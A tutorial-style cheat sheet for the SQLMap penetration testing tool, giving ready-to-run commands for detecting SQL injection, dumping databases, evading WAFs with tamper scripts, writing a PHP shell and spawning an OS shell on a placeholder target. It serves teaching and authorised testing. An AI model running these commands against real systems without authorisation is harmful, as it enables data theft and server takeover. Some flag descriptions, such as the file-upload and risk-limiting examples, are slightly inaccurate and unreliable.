# **SQLMap**
SQLMap is an open-source penetration testing tool designed to automate the process of detecting and exploiting SQL injection flaws. It supports a wide variety of databases such as MySQL, PostgreSQL, Oracle, MSSQL, and more. It can also help extract data from the vulnerable application, bypass filters, and even take control of the database server.

---

## **Basic SQLMap Usage**

1. **Basic Command Structure**
   The general syntax for running SQLMap is:
   
   ```bash
   sqlmap -u <URL> [options]
   ```

   Where `<URL>` is the target URL with a possible injectable parameter. For example:

   ```bash
   sqlmap -u "http://example.com/vulnerable.php?id=1"
   ```

   SQLMap will automatically test the parameter (`id=1`) for SQL injection vulnerabilities.

---

### **1. Detecting SQL Injection**

#### **Testing a Parameter**
To test a URL for SQL injection, simply run:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1"
```

- SQLMap will check if the `id` parameter is vulnerable to SQL injection.
- It tries different types of injection (based on the database type) and returns the result.

#### **Using POST Data (For Forms)**
If a parameter is sent via POST (e.g., from a form submission), you can specify the POST data like this:

```bash
sqlmap -u "http://example.com/login.php" --data "username=admin&password=pass"
```

This command sends the POST data and tests for SQL injection in the `username` and `password` fields.

---

### **2. Advanced Options**

#### **Enumerating Databases**
If SQLMap detects an SQL injection vulnerability, you can use the `--dbs` flag to enumerate the available databases on the target.

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
```

This will return a list of databases present on the target system.

#### **Enumerating Tables**
After finding the database, you can list the tables within a specific database with the `--tables` flag:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D <database_name> --tables
```

- `-D <database_name>` specifies which database you want to query.
- This will return the tables in the specified database.

#### **Enumerating Columns**
Once you have the table names, you can enumerate the columns in a table with the `--columns` flag:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D <database_name> -T <table_name> --columns
```

- `-T <table_name>` specifies the table whose columns you want to list.

#### **Dumping Data from a Table**
To dump data from a specific table, use the `--dump` flag:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D <database_name> -T <table_name> --dump
```

- This will dump all the rows in the specified table.

---

### **3. Bypassing Filters and Security Measures**

SQLMap can bypass certain protections like WAFs (Web Application Firewalls), SQL injection filters, and more.

#### **Bypassing WAFs and Filters**
Use the `--random-agent` flag to randomize the User-Agent string, which can sometimes help bypass security filters.

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --random-agent
```

You can also use the `--tamper` option to evade SQL injection detection mechanisms (e.g., WAFs, IDS).

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=between
```

- `--tamper=between` uses a tampering technique to insert `BETWEEN` statements in the injection.

For more tampering options, you can use the `--tamper` flag with a built-in list of techniques. The full list of tamper scripts can be found in the SQLMap repository: [Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper).

---

### **4. Database Specific Commands**

SQLMap supports different databases, and there are flags for each to optimize queries and exploits.

#### **MySQL**
To force SQLMap to work with MySQL and apply MySQL-specific techniques, use the `--dbms=mysql` flag.

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbms=mysql --dump
```

#### **PostgreSQL**
For PostgreSQL-specific injection, use the `--dbms=postgresql` flag:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbms=postgresql --dump
```

#### **Oracle**
If you are working with Oracle databases, use:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbms=oracle --dump
```

---

### **5. Specifying Custom Injection Points**

If SQLMap fails to detect injection points automatically, you can specify where to inject manually using the `-p` flag.

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1&name=test" -p "id,name" --dump
```

This tells SQLMap to test both `id` and `name` parameters for SQL injection.

---

### **6. Automated Exploitation and File Upload**

SQLMap can automate the exploitation of a vulnerable SQL injection and even allow you to upload a web shell if the server is vulnerable.

#### **Getting a Shell**
To attempt to gain remote access to the server by uploading a PHP shell, you can use:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell
```

- This will attempt to spawn an operating system shell on the target machine.

#### **Uploading Files**
SQLMap can also upload arbitrary files to the target server if file upload functionality exists and is vulnerable. You can upload files using the `--file-read` or `--file-write` flags:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-write="/path/to/shell.php" --os-shell
```

---

### **7. Using a Proxy**

To monitor and modify requests, you can route SQLMap’s traffic through a proxy server like Burp Suite or OWASP ZAP using the `--proxy` option.

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"
```

This will route SQLMap’s traffic through a local proxy running on `127.0.0.1:8080`.

---

### **8. Timing-Based and Blind SQL Injection**

In some cases, SQLMap will automatically detect a **blind** or **time-based** SQL injection, where there is no visible output to indicate success or failure. However, you can explicitly set SQLMap to use **time-based** or **boolean-based** techniques.

#### **Time-Based Blind SQL Injection**
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=T
```
- `--technique=T`: This forces SQLMap to only test time-based techniques for SQL injection.

#### **Boolean-Based Blind SQL Injection**
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=B
```
- `--technique=B`: This forces SQLMap to only test boolean-based SQL injection.

---

### **9. General Best Practices**

- **Use the `--batch` flag** to automate responses (useful for scripts or batch testing).
  
  ```bash
  sqlmap -u "http://example.com/vulnerable.php?id=1" --batch
  ```

- **Use `-v` for verbosity**: Increase verbosity to debug and get more details during testing.
  
  ```bash
  sqlmap -u "http://example.com/vulnerable.php?id=1" -v 3
  ```

- **Limit risk with `--risk` and `--level`**: Adjust the risk and level for more aggressive or safer testing.
  
  ```bash
  sqlmap -u "http://example.com/vulnerable.php?id=1" --risk=3 --level=5
  ```

  - `--risk=3`: Defines the risk of the payload.
  - `--level=5`: Defines the testing level (higher levels increase the intensity of tests).

- **Check for false positives**: Always manually verify results, as automatic tools like SQLMap can sometimes generate false positives.

---

### **10. Example of an Automated Full SQLMap Command**

For an advanced, fully automated scan, combining many of the techniques mentioned above:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs --tables --columns --dump --random-agent --proxy="http://127.0.0.1:8080" --batch -v 3 --technique=T --os-shell


```

This command:
- Enumerates databases, tables, and columns.
- Dumps data from vulnerable tables.
- Uses a random agent and routes traffic through Burp Suite.
- Runs in batch mode (no prompts).
- Increases verbosity for debugging.
- Forces time-based SQL injection.
- Attempts to get an OS shell.

---

### **Conclusion**

SQLMap is an extremely powerful tool for automating SQL injection testing. With its extensive range of options, you can detect vulnerabilities, extract data, and even gain access to a target system if it's misconfigured or vulnerable. Always use SQLMap ethically and legally—ensure you have explicit permission to test a system or application.
